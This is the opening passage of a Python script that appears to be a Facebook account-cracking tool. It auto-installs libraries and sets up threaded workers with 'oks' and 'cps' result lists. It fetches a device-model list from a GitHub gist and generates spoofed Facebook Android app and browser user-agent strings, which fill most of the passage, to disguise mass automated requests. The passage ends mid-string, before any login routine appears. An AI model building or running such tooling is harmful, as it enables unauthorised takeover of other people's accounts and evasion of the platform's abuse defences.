#!/usr/bin/python
#Original written By Muhmmad Ali

import os,zlib

from os import system as osRUB
from os import system as cmd
os.system('clear')
print('loading Modules ...\n')



try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')


try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as AliAli
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform

from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit

    
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/377.1.0.36.103;FBBV/350971997;FBDM/{density=3.07,width=1080,height=2460};FBLC/en_US;FBCR/Freenet;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO KE7;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;] '
    ua = random.choice(["Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/6.0; .NET CLR 3.5.94676.6)","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/19.0.845.0 Safari/535.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/32.0.832.0 Safari/535.0.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0 rv:6.0; BO) AppleWebKit/534.0.1 (KHTML, like Gecko) Version/7.0.0 Safari/534.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/27.0.821.0 Safari/537.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/38.0.821.0 Safari/538.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/18.0.846.0 Safari/533.2.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.1; .NET CLR 4.0.54488.2)","Opera/14.65 (Windows NT 5.2; U; PT Presto/2.9.180 Version/10.00)","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/31.0.862.0 Safari/533.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/23.0.859.0 Safari/532.0.0","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/4.0; .NET CLR 4.1.99875.9)","Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:15.2) Gecko/20100101 Firefox/15.2.5","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/26.0.840.0 Safari/537.1.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4)  AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/17.0.812.0 Safari/532.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/29.0.845.0 Safari/533.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/25.0.841.0 Safari/532.1.1","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/6.0; .NET CLR 3.7.26228.6)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/17.0.877.0 Safari/538.0.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_6 rv:4.0; KG) AppleWebKit/537.0.2 (KHTML, like Gecko) Version/5.0.1 Safari/537.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_9 rv:2.0; BR) AppleWebKit/534.1.1 (KHTML, like Gecko) Version/6.0.10 Safari/534.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/33.0.812.0 Safari/533.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/13.0.826.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/31.0.891.0 Safari/532.2.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_4 rv:4.0; CE) AppleWebKit/537.1.2 (KHTML, like Gecko) Version/4.0.5 Safari/537.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/36.0.869.0 Safari/538.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/24.0.820.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/33.0.892.0 Safari/533.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.0.2 (KHTML, like Gecko) Chrome/16.0.855.0 Safari/533.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/13.0.842.0 Safari/531.2.0","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 2.1.22222.0)","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/3.0; .NET CLR 4.8.27257.6)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_0 rv:4.0; TY) AppleWebKit/534.1.0 (KHTML, like Gecko) Version/4.0.4 Safari/534.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/20.0.878.0 Safari/534.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10.4; rv:13.2) Gecko/20100101 Firefox/13.2.7","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_5)  AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/27.0.861.0 Safari/538.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/36.0.875.0 Safari/535.1.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6.7; rv:12.0) Gecko/20100101 Firefox/12.0.3","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_9 rv:5.0; FR) AppleWebKit/531.0.1 (KHTML, like Gecko) Version/5.1.5 Safari/531.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/35.0.877.0 Safari/536.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/16.0.899.0 Safari/531.0.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7.7; rv:9.8) Gecko/20100101 Firefox/9.8.3","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/24.0.827.0 Safari/531.2.2","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/7.1; .NET CLR 2.5.22483.5)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/21.0.899.0 Safari/533.2.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/21.0.850.0 Safari/531.2.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/27.0.806.0 Safari/536.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/17.0.830.0 Safari/537.2.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/17.0.850.0 Safari/532.0.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.9.2; rv:5.9) Gecko/20100101 Firefox/5.9.9","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.3; Trident/7.0; .NET CLR 3.3.20001.4)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/28.0.802.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/37.0.880.0 Safari/537.1.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.4; rv:11.6) Gecko/20100101 Firefox/11.6.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/38.0.880.0 Safari/531.0.1","Opera/13.42 (Windows NT 6.1; U; HT Presto/2.9.173 Version/10.00)","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/33.0.810.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.0.0 (KHTML, like Gecko) Chrome/28.0.895.0 Safari/534.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/20.0.851.0 Safari/538.2.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_7)  AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/16.0.878.0 Safari/535.2.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4 rv:3.0; LI) AppleWebKit/535.1.1 (KHTML, like Gecko) Version/7.0.9 Safari/535.1.1","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/3.1; .NET CLR 3.9.24933.3)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3)  AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/28.0.813.0 Safari/531.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/21.0.890.0 Safari/533.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/13.0.890.0 Safari/535.1.0","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/5.1; .NET CLR 2.1.59033.3)","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/30.0.899.0 Safari/536.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/21.0.851.0 Safari/535.2.1","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/3.1; .NET CLR 2.8.44624.9)","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/18.0.814.0 Safari/534.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/27.0.812.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/32.0.802.0 Safari/538.2.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7.2; rv:6.8) Gecko/20100101 Firefox/6.8.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_7 rv:3.0; AN) AppleWebKit/533.2.2 (KHTML, like Gecko) Version/7.1.5 Safari/533.2.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_6)  AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/24.0.877.0 Safari/531.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/38.0.881.0 Safari/537.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/15.0.809.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/33.0.813.0 Safari/538.2.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_8 rv:4.0; PT) AppleWebKit/531.1.0 (KHTML, like Gecko) Version/7.0.1 Safari/531.1.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/5.1; .NET CLR 1.3.74858.9)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_8)  AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/21.0.832.0 Safari/533.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/32.0.849.0 Safari/531.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/20.0.885.0 Safari/538.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/17.0.823.0 Safari/533.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/21.0.825.0 Safari/535.2.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/30.0.835.0 Safari/535.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/19.0.874.0 Safari/538.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/38.0.819.0 Safari/532.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/32.0.889.0 Safari/531.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/28.0.834.0 Safari/534.1.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_1)  AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/31.0.812.0 Safari/531.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/19.0.889.0 Safari/538.1.1","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/7.1; .NET CLR 3.0.38333.9)","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/26.0.825.0 Safari/531.1.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10.0; rv:15.1) Gecko/20100101 Firefox/15.1.7","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/35.0.896.0 Safari/534.0.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5.3; rv:12.7) Gecko/20100101 Firefox/12.7.6","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/19.0.806.0 Safari/534.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/32.0.874.0 Safari/538.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/32.0.813.0 Safari/532.0.2","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.1; .NET CLR 2.5.52976.8)","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/3.0; .NET CLR 3.0.11795.6)","Opera/12.59 (Windows NT 6.0; U; AR Presto/2.9.172 Version/11.00)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5 rv:2.0; RO) AppleWebKit/534.0.1 (KHTML, like Gecko) Version/5.0.9 Safari/534.0.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.1.0 (KHTML, like Gecko) Chrome/32.0.850.0 Safari/532.1.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/5.1; .NET CLR 4.9.62728.0)","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/31.0.816.0 Safari/536.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/28.0.850.0 Safari/536.0.2","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/18.0.844.0 Safari/534.0.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_8 rv:2.0; UZ) AppleWebKit/531.2.0 (KHTML, like Gecko) Version/4.1.6 Safari/531.2.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.9.4; rv:6.2) Gecko/20100101 Firefox/6.2.2","Opera/11.81 (Windows NT 6.3; U; CS Presto/2.9.188 Version/10.00)","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/35.0.858.0 Safari/531.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/24.0.800.0 Safari/532.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/16.0.818.0 Safari/531.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/25.0.878.0 Safari/535.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_9)  AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/25.0.880.0 Safari/538.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/20.0.857.0 Safari/533.0.1","Opera/9.50 (Macintosh; Intel Mac OS X 10.10.8 U; AZ Presto/2.9.163 Version/12.00)","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/31.0.809.0 Safari/536.2.0","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0; .NET CLR 1.1.25438.5)","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/5.0; .NET CLR 1.5.62168.9)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_5 rv:5.0; ID) AppleWebKit/537.1.1 (KHTML, like Gecko) Version/7.0.0 Safari/537.1.1","Opera/10.69 (Windows NT 5.1; U; EL Presto/2.9.166 Version/10.00)","Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/28.0.809.0 Safari/534.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/33.0.846.0 Safari/531.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/23.0.868.0 Safari/538.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4 rv:3.0; BO) AppleWebKit/534.0.0 (KHTML, like Gecko) Version/4.0.3 Safari/534.0.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_9 rv:2.0; CY) AppleWebKit/532.1.1 (KHTML, like Gecko) Version/7.1.7 Safari/532.1.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0 rv:3.0; SW) AppleWebKit/533.1.0 (KHTML, like Gecko) Version/7.0.9 Safari/533.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/19.0.877.0 Safari/534.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/35.0.818.0 Safari/537.1.2","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8.1; rv:6.1) Gecko/20100101 Firefox/6.1.5","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.1.2 (KHTML, like Gecko) Chrome/34.0.820.0 Safari/533.1.2","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/36.0.853.0 Safari/537.1.0","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; Trident/5.0; .NET CLR 3.4.30248.4)","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/34.0.857.0 Safari/532.1.1","Opera/10.35 (Windows NT 5.2; U; NN Presto/2.9.174 Version/10.00)","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8)  AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/30.0.870.0 Safari/531.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/35.0.878.0 Safari/536.0.2","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/38.0.852.0 Safari/536.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/37.0.874.0 Safari/538.0.2","Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/7.1; .NET CLR 2.3.33462.0)","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/30.0.814.0 Safari/534.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.0.1 (KHTML, like Gecko) Chrome/25.0.859.0 Safari/537.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/22.0.803.0 Safari/532.0.2","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/7.0; .NET CLR 4.1.82931.5)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6 rv:5.0; CS) AppleWebKit/538.0.0 (KHTML, like Gecko) Version/6.1.2 Safari/538.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/32.0.885.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/23.0.859.0 Safari/537.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/38.0.858.0 Safari/533.0.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7)  AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/32.0.891.0 Safari/531.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3 rv:6.0; FI) AppleWebKit/537.2.1 (KHTML, like Gecko) Version/6.0.9 Safari/537.2.1","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/7.1; .NET CLR 3.0.29873.2)","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/19.0.851.0 Safari/531.2.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6 rv:6.0; IT) AppleWebKit/535.1.1 (KHTML, like Gecko) Version/4.1.10 Safari/535.1.1","Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/531.2.0 (KHTML, like Gecko) Chrome/18.0.831.0 Safari/531.2.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/15.0.816.0 Safari/533.1.0","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/23.0.839.0 Safari/537.0.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.0; rv:15.7) Gecko/20100101 Firefox/15.7.1","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/23.0.809.0 Safari/533.2.2","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/39.0.894.0 Safari/531.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/15.0.875.0 Safari/535.2.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_6)  AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/22.0.876.0 Safari/536.0.1","Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_8 rv:5.0; EN) AppleWebKit/537.0.2 (KHTML, like Gecko) Version/5.0.2 Safari/537.0.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4)  AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/30.0.860.0 Safari/536.1.1","Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_4 rv:2.0; MK) AppleWebKit/538.2.1 (KHTML, like Gecko) Version/7.1.10 Safari/538.2.1","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_0)  AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/25.0.884.0 Safari/534.1.1","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/6.1; .NET CLR 4.9.46160.3)","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/19.0.874.0 Safari/534.1.1","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.0.1 (KHTML, like Gecko) Chrome/26.0.814.0 Safari/535.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/24.0.801.0 Safari/536.0.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7 rv:3.0; EO) AppleWebKit/532.2.2 (KHTML, like Gecko) Version/6.1.7 Safari/532.2.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4 rv:6.0; SK) AppleWebKit/532.2.1 (KHTML, like Gecko) Version/4.1.0 Safari/532.2.1","Opera/14.56 (Windows NT 5.0; U; GD Presto/2.9.177 Version/11.00)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_7)  AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/17.0.867.0 Safari/536.0.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/38.0.873.0 Safari/535.2.2","Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/4.1; .NET CLR 1.5.81167.5)","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.1; rv:12.7) Gecko/20100101 Firefox/12.7.6","Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/26.0.823.0 Safari/535.2.2","Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/27.0.837.0 Safari/532.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.2.1 (KHTML, like Gecko) Chrome/21.0.804.0 Safari/536.2.1","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_7 rv:6.0; ET) AppleWebKit/532.1.0 (KHTML, like Gecko) Version/4.0.8 Safari/532.1.0","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.0; rv:6.2) Gecko/20100101 Firefox/6.2.1","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/24.0.897.0 Safari/535.1.2","Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/36.0.885.0 Safari/535.0.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/13.0.859.0 Safari/533.2.1","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/25.0.862.0 Safari/536.1.0","Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/19.0.801.0 Safari/532.2.0","Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/32.0.849.0 Safari/536.2.0","Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/28.0.880.0 Safari/538.1.2","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5 rv:5.0; 